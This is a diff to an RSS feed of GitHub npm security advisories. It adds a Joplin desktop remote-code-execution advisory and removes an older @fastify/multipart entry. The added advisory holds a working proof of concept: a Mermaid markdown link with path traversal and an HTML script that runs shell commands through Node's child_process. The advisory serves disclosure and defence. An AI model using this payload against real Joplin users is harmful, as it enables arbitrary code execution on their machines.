@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2025-01-30T18:01:35.316Z</updated>
+    <updated>2025-01-30T19:01:22.748Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,88 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[joplin] Remote Code Execution on click of <a> Link in markdown preview]]></title>
+        <id>https://github.com/advisories/GHSA-hff8-hjwv-j9q7</id>
+        <link href="https://github.com/advisories/GHSA-hff8-hjwv-j9q7"/>
+        <updated>2025-01-30T18:05:56.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>There is a vulnerability in <code>Joplin-desktop</code> that leads to remote code execution (RCE) when a user clicks on an <code>&lt;a&gt;</code> link within untrusted notes. The issue arises due to insufficient sanitization of <code>&lt;a&gt;</code> tag attributes introduced by the <code>Mermaid</code>. This vulnerability allows the execution of untrusted HTML content within the Electron window, which has full access to Node.js APIs, enabling arbitrary shell command execution.</p>
+<h3 id="details">Details</h3>
+<p>In the markdown preview iframe, <code>Joplin</code> only opens <code>&lt;a&gt;</code> links internally within the same Electron window if they contain the <code>data-from-md</code> attribute. While Joplin successfully sanitizes the <code>data-from-md</code> attribute in user-embedded <code>&lt;a&gt;</code> links from the <code>.md</code> file to prevent the execution of untrusted HTML content, it fails to sanitize the <code>data-from-md</code> attributes of <code>&lt;a&gt;</code> tags introduced by <code>Mermaid</code> (e.g., the code snippet shown below). Since <code>Mermaid</code> allows the rendering of certain scriptless HTML elements, an attacker can embed <code>&lt;a&gt; </code>tags with <code>data-from-md</code> attributes, which will then be opened internally in the same Electron window.</p>
+<p>Additionally, <code>Joplin</code> opens the window with <code>nodeIntegration</code> set to <code>true</code> and <code>contextIsolation</code> set to <code>false</code>, resulting in any scripts running in the opened window having full access to Node.js APIs. Furthermore, the markdown preview iframe shares the same origin (i.e.,local file system) as its parent and lacks the <code>sandbox</code> attribute, allowing scripts running in the iframe to call Node.js APIs through <code>window.parent</code>. As a result, an attacker can execute arbitrary code using Node.js APIs by exploiting HTML files stored on the local file system, which share the same origin as the parent.</p>
+<p><strong>Relevant code references:</strong></p>
+<ul>
+<li>Payload to inject <code>&lt;a&gt;</code> with <code>data-from-md</code> attribute:</li>
+</ul>
+<pre><code class="language-markdown">```mermaid
+flowchart TD
+    A[&lt;a href="https://attacker.com" data-from-md&gt;hello&lt;/a&gt;]
+```
+</code></pre>
+<ul>
+<li>Handling link navigation in the markdown preview iframe</li>
+</ul>
+<p><a href="https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/lib/renderers/webviewLib.js#L93-L116">https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/lib/renderers/webviewLib.js#L93-L116</a></p>
+<ul>
+<li>Window configuration of <code>Joplin</code> window</li>
+</ul>
+<p><a href="https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/app-desktop/ElectronAppWrapper.ts#L141-L155">https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/app-desktop/ElectronAppWrapper.ts#L141-L155</a></p>
+<h3 id="poc">PoC</h3>
+<p>Considering the user has downloaded the following shared files from the internet (Note: the threat model aligns with existing published security issues: <a href="https://github.com/laurent22/joplin/security/advisories/GHSA-2h88-m32f-qh5m">GHSA-2h88-m32f-qh5m</a> and <a href="https://github.com/laurent22/joplin/security/advisories/GHSA-g8qx-5vcm-3x59">GHSA-g8qx-5vcm-3x59</a>, where the malicious HTML file is available locally):</p>
+<ul>
+<li><code>poc.md</code></li>
+</ul>
+<pre><code class="language-markdown">```mermaid
+flowchart TD
+    A[&lt;a href="/../../../../../../../../../../../../../../../path/to/poc2.html" data-from-md&gt;hello&lt;/a&gt;]
+```
+</code></pre>
+<ul>
+<li><code>poc2.html</code></li>
+</ul>
+<pre><code>&lt;html&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      if (typeof window.parent.require !== 'undefined') {
+        const { exec } = window.parent.require('child_process');
+        exec('ls -al', (err, stdout, stderr) =&gt; {
+          if (err) {
+            document.body.innerText = `Error: ${err.message}`;
+            return;
+          }
+          if (stderr) {
+            document.body.innerText = `Stderr: ${stderr}`;
+            return;
+          }
+          document.body.innerText = stdout;
+        });
+      } else {
+        document.body.innerText = 'Require is not available in this environment.';
+      }
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Then, open the <code>poc.md</code> with <code>Joplin</code> and click on the <code>hello</code> link. The code embedded in the <code>poc2.html</code> will be executed.</p>
+<p><img alt="result" src="https://github.com/user-attachments/assets/e85fbad8-a348-49cd-af51-4fc302dd6a8f"></p>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability can lead to Remote Code Execution (RCE) when users open and interact with untrusted notes, while malicious HTML files are available locally.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7">https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49362">https://nvd.nist.gov/vuln/detail/CVE-2024-49362</a></li>
+<li><a href="https://github.com/advisories/GHSA-hff8-hjwv-j9q7">https://github.com/advisories/GHSA-hff8-hjwv-j9q7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hff8-hjwv-j9q7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2024-11-14T17:38:14.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[snowflake-sdk] snowflake-sdk may incorrectly validate temporary credential cache file permissions]]></title>
         <id>https://github.com/advisories/GHSA-xfhv-wqj6-rx99</id>
@@ -861,35 +943,5 @@ I had to upload it to YouTube, because GitHub allows only 10MB videos.</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2025-01-23T22:35:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@fastify/multipart] Unlimited consumption of resources in @fastify/multipart]]></title>
-        <id>https://github.com/advisories/GHSA-27c6-mcxv-x3fh</id>
-        <link href="https://github.com/advisories/GHSA-27c6-mcxv-x3fh"/>
-        <updated>2025-01-23T23:17:18.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <code>saveRequestFiles</code> function does not delete the uploaded temporary files when user cancels the request.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in version 8.3.1 and 9.0.3</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Do not use <code>saveRequestFiles</code>.</p>
-<h3 id="references">References</h3>
-<p>This was identified in <a href="https://github.com/fastify/fastify-multipart/issues/546">https://github.com/fastify/fastify-multipart/issues/546</a> and fixed in <a href="https://github.com/fastify/fastify-multipart/pull/567">https://github.com/fastify/fastify-multipart/pull/567</a>.</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh">https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh</a></li>
-<li><a href="https://github.com/fastify/fastify-multipart/issues/546">https://github.com/fastify/fastify-multipart/issues/546</a></li>
-<li><a href="https://github.com/fastify/fastify-multipart/pull/567">https://github.com/fastify/fastify-multipart/pull/567</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24033">https://nvd.nist.gov/vuln/detail/CVE-2025-24033</a></li>
-<li><a href="https://github.com/advisories/GHSA-27c6-mcxv-x3fh">https://github.com/advisories/GHSA-27c6-mcxv-x3fh</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-27c6-mcxv-x3fh</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-01-23T18:02:07.000Z</published>
     </entry>
 </feed>
